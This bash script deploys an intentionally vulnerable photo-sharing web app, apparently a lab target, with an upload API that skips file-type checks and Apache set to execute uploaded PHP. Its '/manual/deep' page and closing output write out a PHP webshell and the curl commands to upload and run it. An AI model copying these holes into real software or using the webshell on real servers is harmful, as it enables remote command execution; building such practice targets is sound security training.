#!/bin/bash

echo "🚀 Deploying Vulnerable PhotoShare to VPS..."

# Update system
sudo apt update && sudo apt upgrade -y

# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Install PHP and Apache for webshell execution
sudo apt install -y apache2 php libapache2-mod-php

# Create application directory
sudo mkdir -p /var/www/photoshare
cd /var/www/photoshare

# Create uploads directory
sudo mkdir -p /var/www/photoshare/uploads

# Create package.json
sudo tee package.json > /dev/null << 'EOF'
{
  "name": "photoshare-vulnerable",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "pm2": "pm2 start server.js --name photoshare"
  },
  "dependencies": {
    "express": "^4.18.2",
    "multer": "^1.4.5-lts.1",
    "cors": "^2.8.5"
  }
}
EOF

# Install dependencies
sudo npm install

# Create the complete server file
sudo tee server.js > /dev/null << 'SERVEREOF'
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, file.originalname)
});

const upload = multer({ storage: storage });

function authenticate(req, res, next) {
    const token = req.headers.authorization;
    if (token !== 'AUTH_TOKEN') {
        return res.status(401).json({ error: 'Invalid token' });
    }
    next();
}

// Main upload page
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhotoShare - Image Sharing Platform</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 500px;
            width: 90%;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 28px; font-weight: bold; color: #667eea; margin-bottom: 10px; }
        .subtitle { color: #666; font-size: 16px; }
        .upload-section {
            border: 2px dashed #e0e0e0;
            border-radius: 15px;
            padding: 40px 20px;
            text-align: center;
            margin: 30px 0;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .upload-section:hover { border-color: #667eea; background: #f8f9ff; }
        .upload-icon { font-size: 48px; color: #667eea; margin-bottom: 20px; }
        .upload-text { color: #333; font-size: 18px; margin-bottom: 10px; }
        .upload-subtext { color: #999; font-size: 14px; }
        .file-input { display: none; }
        .upload-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 20px;
            width: 100%;
        }
        .upload-btn:hover { transform: translateY(-2px); }
        .info-section { background: #f8f9ff; padding: 20px; border-radius: 10px; margin-top: 20px; }
        .info-title { color: #333; font-weight: bold; margin-bottom: 10px; }
        .info-list { color: #666; font-size: 14px; line-height: 1.6; }
        .progress-bar { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; margin: 15px 0; overflow: hidden; display: none; }
        .progress-fill { height: 100%; background: linear-gradient(45deg, #667eea, #764ba2); border-radius: 3px; transition: width 0.3s ease; }
        .status { text-align: center; margin-top: 15px; font-size: 14px; display: none; }
        .success { color: #27ae60; }
        .error { color: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">📸 PhotoShare</div>
            <div class="subtitle">Image Sharing Web</div>
        </div>
        <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
            <div class="upload-section" onclick="document.getElementById('fileInput').click()">
                <div class="upload-icon">☁️</div>
                <div class="upload-text">Upload Photo</div>
                <div class="upload-subtext">Click to select or drag and drop your image</div>
                <input type="file" id="fileInput" name="admin" class="file-input" accept="image/*">
            </div>
            <div class="progress-bar" id="progressBar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="status" id="status"></div>
            <button type="submit" class="upload-btn">Upload Photo</button>
        </form>
        <div class="info-section">
            <div class="info-title">Upload Guidelines</div>
            <div class="info-list">
                • Maximum file size: 10MB<br>
                • Supported formats: JPG, PNG, GIF<br>
                • Minimum resolution: 200x200px<br>
                • Photos are automatically optimized
            </div>
        </div>
    </div>
    <script>
        const form = document.getElementById('uploadForm');
        const fileInput = document.getElementById('fileInput');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');
        const status = document.getElementById('status');
        
        fileInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                document.querySelector('.upload-text').textContent = file.name;
                document.querySelector('.upload-subtext').textContent = 'Ready to upload';
            }
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const file = fileInput.files[0];
            if (!file) {
                showStatus('Please select a file first', 'error');
                return;
            }
            
            const formData = new FormData();
            formData.append('admin', file);
            
            progressBar.style.display = 'block';
            status.style.display = 'block';
            showStatus('Uploading...', '');
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 20;
                if (progress > 90) progress = 90;
                progressFill.style.width = progress + '%';
            }, 100);
            
            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    headers: { 'authorization': 'AUTH_TOKEN' },
                    body: formData
                });
                
                clearInterval(interval);
                progressFill.style.width = '100%';
                
                if (response.ok) {
                    showStatus('Photo uploaded successfully!', 'success');
                    setTimeout(() => { window.location.href = '/uploads'; }, 1500);
                } else {
                    const errorText = await response.text();
                    if (errorText.includes('Invalid file type')) {
                        showStatus('Invalid file type. Only JPG, PNG, GIF allowed.', 'error');
                    } else {
                        showStatus('Upload failed. Please try again.', 'error');
                    }
                }
            } catch (error) {
                clearInterval(interval);
                showStatus('Upload failed. Please try again.', 'error');
            }
        });
        
        function showStatus(message, type) {
            status.textContent = message;
            status.className = 'status ' + type;
        }
    </script>
</body>
</html>`);
});

// Secure form upload
app.post('/upload', authenticate, upload.single('admin'), (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');
    
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
    const fileExtension = path.extname(req.file.originalname).toLowerCase();
    
    if (!allowedExtensions.includes(fileExtension)) {
        fs.unlinkSync(req.file.path);
        return res.status(400).send('<h1>Upload Failed</h1><p>Invalid file type. Only JPG, PNG, and GIF files are allowed.</p><a href="/">Go back</a>');
    }
    
    console.log('✅ SECURE UPLOAD:', req.file.filename);
    res.redirect('/uploads');
});

// VULNERABLE API endpoint
app.put('/api/users/one/admin/photo', authenticate, upload.single('admin'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    
    console.log('🚨 VULNERABLE UPLOAD:', req.file.filename);
    
    const fileExtension = path.extname(req.file.originalname).toLowerCase();
    if (['.php', '.jsp', '.asp', '.aspx'].includes(fileExtension)) {
        console.log('💀 WEBSHELL DETECTED:', req.file.filename);
        console.log('   Execute at: http://YOUR_SERVER_IP/uploads/' + req.file.filename);
    }
    
    res.json({
        message: 'File uploaded successfully via API',
        filename: req.file.filename,
        webshell_url: 'http://YOUR_SERVER_IP/uploads/' + req.file.filename,
        vulnerability: 'API bypasses validation AND enables execution!'
    });
});

// Manual and uploads pages
app.get('/manual', (req, res) => {
    res.send('<h1>PhotoShare Manual</h1><p>How to use PhotoShare safely and securely.</p><a href="/">Back to Upload</a> | <a href="/uploads">View Uploads</a> | <a href="/manual/deep">Advanced</a>');
});

app.get('/manual/deep', (req, res) => {
    res.send(`<h1>Advanced Security Testing</h1>
<h2>Webshell Upload Test:</h2>
<pre>
# Create webshell
echo '&lt;?php if(isset($_REQUEST["cmd"])) { echo "&lt;pre&gt;"; system($_REQUEST["cmd"]); echo "&lt;/pre&gt;"; } ?&gt;' > shell.php

# Upload webshell
curl -i 'http://YOUR_SERVER_IP:3000/api/users/one/admin/photo' \\
  -X PUT \\
  -H 'authorization: AUTH_TOKEN' \\
  -F "admin=@shell.php;filename=shell.php"

# Execute commands
curl 'http://YOUR_SERVER_IP/uploads/shell.php?cmd=whoami'
</pre>
<a href="/">Back to Upload</a>`);
});

app.get('/uploads', (req, res) => {
    fs.readdir('uploads', (err, files) => {
        if (err) files = [];
        const fileList = files.map(file => {
            const stats = fs.statSync('uploads/' + file);
            const isPHP = /\.php$/i.test(file);
            return { name: file, size: stats.size, isPHP: isPHP };
        });
        
        let html = '<h1>📸 PhotoShare Gallery</h1>';
        html += '<a href="/">📤 Upload New</a> | <a href="/manual">📖 Manual</a><br><br>';
        
        if (fileList.filter(f => f.isPHP).length > 0) {
            html += '<div style="background: #ff4444; color: white; padding: 10px; margin: 10px 0;">⚠️ WEBSHELLS DETECTED!</div>';
        }
        
        if (fileList.length === 0) {
            html += '<p>No files uploaded yet.</p>';
        } else {
            html += '<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px;">';
            fileList.forEach(file => {
                html += '<div style="border: 1px solid #ddd; padding: 10px; border-radius: 5px;' + (file.isPHP ? ' background: #ffeeee; border-color: #ff4444;' : '') + '">';
                html += '<strong>' + file.name + '</strong><br>';
                html += 'Size: ' + file.size + ' bytes<br>';
                if (file.isPHP) {
                    html += '<span style="color: #ff4444;">💀 EXECUTABLE PHP</span><br>';
                    html += '<a href="/uploads/' + file.name + '" target="_blank" style="background: #ff4444; color: white; padding: 5px 10px; text-decoration: none; border-radius: 3px;">Execute Webshell</a>';
                } else {
                    html += '<a href="/uploads/' + file.name + '" target="_blank">View/Download</a>';
                }
                html += '</div>';
            });
            html += '</div>';
        }
        res.send(html);
    });
});

app.listen(PORT, () => {
    console.log('📸 PhotoShare running on http://localhost:' + PORT);
    console.log('🚨 WEBSHELL EXECUTION ENABLED!');
    console.log('   PHP files in uploads/ directory will execute');
    console.log('   Upload webshells via API: PUT /api/users/one/admin/photo');
});
SERVEREOF

# Configure Apache virtual host for uploads
sudo tee /etc/apache2/sites-available/uploads.conf > /dev/null << 'APACHEEOF'
<VirtualHost *:80>
    DocumentRoot /var/www/photoshare/uploads
    ServerName localhost
    
    <Directory /var/www/photoshare/uploads>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
        
        <FilesMatch "\.php$">
            SetHandler application/x-httpd-php
        </FilesMatch>
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/uploads_error.log
    CustomLog ${APACHE_LOG_DIR}/uploads_access.log combined
</VirtualHost>
APACHEEOF

# Enable modules and site
sudo a2enmod php*
sudo a2ensite uploads
sudo systemctl reload apache2

# Set proper permissions
sudo chown -R www-data:www-data /var/www/photoshare
sudo chmod -R 755 /var/www/photoshare

# Create systemd service
sudo tee /etc/systemd/system/photoshare.service > /dev/null << 'SERVICEEOF'
[Unit]
Description=PhotoShare Vulnerable App
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/photoshare
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SERVICEEOF

# Start service
sudo systemctl daemon-reload
sudo systemctl enable photoshare
sudo systemctl start photoshare

# Configure firewall
sudo ufw allow 3000/tcp
sudo ufw allow 80/tcp

echo ""
echo "✅ DEPLOYMENT COMPLETE!"
echo ""
echo "🚀 PhotoShare running on:"
echo "   Main App: http://$(curl -s ifconfig.me):3000"
echo "   Webshells: http://$(curl -s ifconfig.me)/uploads/filename.php"
echo ""
echo "🚨 VULNERABILITIES:"
echo "   1. File upload bypass via API"
echo "   2. PHP execution enabled"
echo "   3. Direct webshell access"
echo ""
echo "🔧 Test webshell upload:"
echo "   curl -F 'admin=@shell.php;filename=shell.php' -H 'authorization: AUTH_TOKEN' -X PUT http://$(curl -s ifconfig.me):3000/api/users/one/admin/photo"
